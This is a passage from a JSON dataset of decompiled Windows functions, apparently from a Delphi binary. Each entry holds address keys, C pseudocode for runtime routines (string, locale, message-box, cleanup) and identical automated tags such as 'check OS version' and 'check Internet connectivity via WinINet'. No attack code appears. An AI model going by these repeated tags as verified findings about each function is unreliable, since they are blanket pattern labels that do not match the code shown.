fcn.0040a49c(&fcn.0040a738::var_18h + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040a5bc(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40a82e;\n        cVar1 = fcn.0040a49c(&fcn.0040a738::var_18h + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040a5bc();\n            if (cVar1 == '\\0') {\n                fcn.0040987c();\n                if (var_ah == '\\x01') {\n                    var_14h = var_ch;\n                    var_12h._0_2_ = var_eh;\n                }\n                else {\n                    var_12h._0_2_ = var_ch;\n                    var_14h = var_eh;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040a738::var_18h + 1;\n                cVar1 = fcn.0040a49c(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040aa38;\n                if (var_ah == '\\0') {\n                    var_18h._0_1_ = var_18h._1_1_;\n                    var_12h._0_2_ = var_ch;\n                    var_14h = var_eh;\n                }\n                else if (var_ah == '\\x01') {\n                    var_18h._0_1_ = var_18h._1_1_;\n                    var_12h._0_2_ = var_eh;\n                    var_14h = var_ch;\n                }\n                else if (var_ah == '\\x02') {\n                    var_18h._0_1_ = var_18h._3_1_;\n                    var_12h._0_2_ = var_eh;\n                    var_14h = var_12h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_18h < 3) {\n                        fcn.0040987c();\n                    }\n                }\n                else {\n                    fcn.0040a6dc(&stack0xfffffffc);\n                }\n            }\n            fcn.0040a5bc();\n            fcn.0040a478();\n            if ((*0x46374c != '\\0') && (iVar2 = fcn.004045ac(),  iVar2 != 0)) {\n                if (**0x4636a0 - 0x30U < 10) {\n                    fcn.0040a640();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.00404268(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040a478();\n                        iVar2 = fcn.00404268();\n                        if (iVar2 < *param_2) break;\n                        fcn.00404268();\n                        fcn.004044c8();\n                        iVar2 = fcn.00407ce0();\n                        if (iVar2 == 0) break;\n                        fcn.00404268();\n                        fcn.004044c8();\n                        iVar2 = fcn.00407ce0();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_9h = fcn.00409620(var_8h);\n            in_stack_ffffffac = var_8h;\n        }\n    }\ncode_r0x0040aa38:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00403fcc(0x40aa5a);\n    return;\n}\n",
        "token_count": 1299
    },
    "0040aa7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040aa7c(void)\n\n{\n    char cVar1;\n    ushort extraout_var;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *puVar4;\n    ushort uVar5;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040a530();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040a530(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040a530();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040a530(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040a478();\n    }\n    cVar1 = fcn.0040a49c(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        uVar5 = 0x40;\n        cVar1 = fcn.0040a5bc();\n        if (cVar1 != '\\0') {\n            puVar4 = &stack0xffffffe8;\n            cVar1 = fcn.0040a49c(puVar4);\n            uVar5 = puVar4 >> 0x10;\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xab5a;\n            cVar1 = fcn.0040a5bc();\n            if (cVar1 != '\\0') {\n                puVar4 = &stack0xffffffe4;\n                cVar1 = fcn.0040a49c(puVar4);\n                in_stack_ffffffd4 = puVar4;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40ab87;\n                cVar1 = fcn.0040a5bc();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040a49c(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040a530();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040a530(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040a530();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040a530(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040a478();\n            uVar2 = fcn.00409518(in_stack_ffffffd0, CONCAT22(extraout_var, uVar5));\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 824
    },
    "0040adf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040adf0(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040ad7c(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00405b0c();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040af50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040af50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x46374c) == 0) {\n            fcn.004041a0();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0040b470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040b470(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40b484;\n    fcn.0040b2e8(0x400);\n    if (**0x4620fc == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x461ec0 + 4);\n        puStack1112 = 0x40b506;\n        puStack1112 = fcn.00405044();\n        uStack1116 = 0x40b50c;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40b498;\n        fcn.00402af0();\n        puStack1100 = 0x40b49d;\n        fcn.00402824();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40b4ac;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40b4bc;\n        uStack1116 = fcn.004085dc();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40b4c9;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40b534, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "0040b94c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b94c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40bb07;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00405b0c();\n    }\n    else {\n        fcn.00405b0c();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.00404218();\n            fcn.004084ac();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00405b0c();\n            fcn.0040b574(arg_8h_00, puVar4);\n            goto code_r0x0040bad6;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h_00, puVar4);\ncode_r0x0040bad6:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00403fa8(0x40bb0e);\n    fcn.00403fcc();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 865
    },
    "0040bc78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040bc78(void)\n\n{\n    if (*0x463794 != NULL) {\n        *(*0x463794 + 3) = 1;\n        (**(**0x463794 + -8))();\n        *0x463794 = NULL;\n    }\n    if (*0x463798 != 0) {\n        *(*0x463798 + 0xc) = 1;\n        fcn.00403258();\n        *0x463798 = 0;\n    }\n    **0x461e48 = 0;\n    **0x461f40 = 0;\n    **0x461eb4 = 0;\n    **0x461f24 = 0;\n    **0x461f48 = 0;\n    **0x462088 = 0;\n    return;\n}\n",
        "token_count": 176
    },
    "0040be74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040be74(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x46110c) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x46110c) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x46110c) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 364
    },
    "0040beec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040beec(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x46374c != '\\0') {\n        fcn.00404468();\n        uVar1 = fcn.0040be74();\n    }\n    return uVar1;\n}\n",
        "token_count": 70
    },
    "0040bf10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040bf10(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x46374c != '\\0') {\n        uVar1 = fcn.0040be74();\n    }\n    return uVar1;\n}\n",
        "token_count": 62
    },
    "0040bf50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bf50(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < param_2) {\n        iVar1 = fcn.00404268();\n        if ((param_2 <= iVar1) && (iVar3 = param_2,  *0x46374c != '\\0')) {\n            iVar1 = 1;\n            iVar3 = 0;\n            if (0 < param_2) {\n                do {\n                    uVar2 = *(in_EAX + -1 + iVar1);\n                    if ((*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) == 0) {\n                        iVar1 = iVar1 + 1;\n                    }\n                    else {\n                        iVar1 = fcn.0040c160();\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar1 <= param_2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 258
    },
    "0040c038": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040c038(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *in_stack_ffffffec;\n    uchar *puVar3;\n    int32_t iStack16;\n    \n    puVar3 = &stack0xfffffff0;\n    iStack16 = 0;\n    iVar2 = iStack16;\n    if (0 < param_2) {\n        in_stack_ffffffec = 0x40c051;\n        iVar1 = fcn.00404268();\n        iVar2 = iStack16;\n        if (((param_2 <= iVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x46374c != '\\0')) {\n            fcn.0040bfa8(&stack0xfffffff0);\n            if ((iStack16 < param_2 + -1) || (iVar2 = fcn.00404268(),  iVar2 <= puVar3)) {\n                in_stack_ffffffec = NULL;\n                iVar2 = iStack16;\n            }\n            else {\n                in_stack_ffffffec = puVar3 + 1;\n                iVar2 = iStack16;\n            }\n        }\n    }\n    iStack16 = iVar2;\n    return CONCAT44(iStack16, in_stack_ffffffec);\n}\n",
        "token_count": 306
    },
    "0040c09c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040c09c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *in_stack_ffffffec;\n    uchar *puVar3;\n    int32_t iStack16;\n    \n    puVar3 = &stack0xfffffff0;\n    iStack16 = 0;\n    iVar1 = iStack16;\n    if (0 < param_2) {\n        in_stack_ffffffec = 0x40c0b5;\n        iVar1 = fcn.00404268();\n        if (iVar1 < param_2) {\n            in_stack_ffffffec = 0x40c0c0;\n            param_2 = fcn.00404268();\n        }\n        iVar1 = param_2;\n        if (*0x46374c != '\\0') {\n            fcn.0040bfa8(&stack0xfffffff0);\n            iVar2 = fcn.00404268();\n            in_stack_ffffffec = puVar3;\n            iVar1 = iStack16;\n            if (iVar2 < puVar3) {\n                in_stack_ffffffec = fcn.00404268();\n                iVar1 = iStack16;\n            }\n        }\n    }\n    iStack16 = iVar1;\n    return CONCAT44(iStack16, in_stack_ffffffec);\n}\n",
        "token_count": 299
    },
    "0040c0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040c0fc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x46374c != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040c124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c124(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x46374c != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00404468();\n        uVar1 = fcn.0040c0fc();\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "0040c160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c160(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x46374c != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.00404468();\n        iVar1 = fcn.0040c0fc();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 168
    },
    "0040c24c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040c24c(uint param_1, uint32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x46374c == '\\0') {\n        uVar4 = fcn.00407c74();\n    }\n    else {\n        iVar3 = fcn.00404268();\n        uVar4 = fcn.004045f4();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.004044c0();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x46110c) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *((*param_2 - 1) + iVar6);\n                    uVar4 = *param_2 & 0xffffff00 | cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.004044c0();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.004044c0();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 433
    },
    "0040c2d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040c2d8(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.004085dc();\n        uVar2 = fcn.004085dc();\n        iVar4 = fcn.00408774();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040bf10();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA();\n                if (iVar3 == 2) goto code_r0x0040c36e;\n            }\n            iVar4 = fcn.00408774();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040c36e:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 315
    },
    "0040c640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040c640(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40c90b;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040c640::var_18h;\n    var_1ch = 0x40c663;\n    var_ch = unaff_EBX;\n    fcn.0040c4cc();\n    var_1ch = 0x40c668;\n    fcn.0040ae2c();\n    if (*0x46374c != '\\0') {\n        var_1ch = 0x40c676;\n        fcn.0040b004();\n    }\n    var_1ch = 0x40c67b;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040c640::var_10h;\n    var_20h = 0x40c68f;\n    fcn.0040ad7c(var_1ch);\n    var_20h = 0x40c69c;\n    fcn.00403ffc();\n    var_20h = &fcn.0040c640::var_14h;\n    var_24h = 0x40c6b1;\n    fcn.0040ad7c(var_20h);\n    var_24h = 0x40c6bb;\n    *0x463684 = fcn.00407fc8();\n    var_24h = &fcn.0040c640::var_18h;\n    var_28h = 0x40c6d5;\n    fcn.0040ad7c(var_24h);\n    var_28h = 0x40c6df;\n    *0x463685 = fcn.00407fc8();\n    var_28h = 0x40c6f2;\n    *0x463686 = fcn.0040adc8();\n    var_28h = 0x40c705;\n    *0x463687 = fcn.0040adc8();\n    var_28h = &fcn.0040c640::var_1ch;\n    var_2ch = 0x40c71f;\n    fcn.0040ad7c(var_28h);\n    var_2ch = 0x40c729;\n    *0x463688 = fcn.00407fc8();\n    var_2ch = 0x40c73c;\n    *0x463689 = fcn.0040adc8();\n    var_2ch = &fcn.0040c640::var_24h;\n    var_30h = 0x40c756;\n    fcn.0040ad7c(var_2ch);\n    var_30h = 0x40c761;\n    fcn.0040b0b4();\n    var_30h = 0x40c76e;\n    fcn.00403ffc();\n    var_30h = &fcn.0040c640::var_2ch;\n    var_34h = 0x40c783;\n    fcn.0040ad7c(var_30h);\n    var_34h = 0x40c78e;\n    fcn.0040b0b4();\n    var_34h = 0x40c79b;\n    fcn.00403ffc();\n    var_34h = 0x40c7a9;\n    *0x463694 = fcn.0040adc8();\n    var_34h = &fcn.0040c640::var_30h;\n    var_38h = 0x40c7c3;\n    fcn.0040ad7c(var_34h);\n    var_38h = 0x40c7d0;\n    fcn.00403ffc();\n    var_38h = &fcn.0040c640::var_34h;\n    var_3ch = 0x40c7e5;\n    fcn.0040ad7c(var_38h);\n    var_3ch = 0x40c7f2;\n    fcn.00403ffc();\n    var_3ch = 0x40c7fa;\n    fcn.00403fa8();\n    var_3ch = 0x40c802;\n    fcn.00403fa8();\n    var_3ch = &fcn.0040c640::var_38h;\n    var_40h = 0x40c817;\n    fcn.0040ad7c(var_3ch);\n    var_40h = 0x40c821;\n    iVar1 = fcn.00407fc8();\n    if (iVar1 == 0) {\n        var_40h = 0x40c832;\n        fcn.00404040();\n    }\n    else {\n        var_40h = 0x40c841;\n        fcn.00404040();\n    }\n    var_40h = &fcn.0040c640::var_3ch;\n    fcn.0040ad7c(var_40h);\n    iVar1 = fcn.00407fc8();\n    if (iVar1 == 0) {\n        fcn.0040ad7c(&fcn.0040c640::var_40h);\n        iVar1 = fcn.00407fc8();\n        if (iVar1 == 0) {\n            fcn.00404040();\n        }\n        else {\n            fcn.00404040();\n        }\n    }\n    fcn.00404328(var_ch, 0x40c9a4, var_4h, var_8h);\n    fcn.00404328(var_ch, 0x40c9b0, var_4h, var_8h);\n    *0x46374e = fcn.0040adc8();\n    *in_FS_OFFSET = var_ch;\n    fcn.00403fcc(0x40c912);\n    return;\n}\n",
        "token_count": 1683
    },
    "0040ca88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040ca88(void)\n\n{\n    while( true ) {\n        if (*0x46130c == NULL) break;\n        *0x46130c = **0x46130c;\n        fcn.004026dc();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040caa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
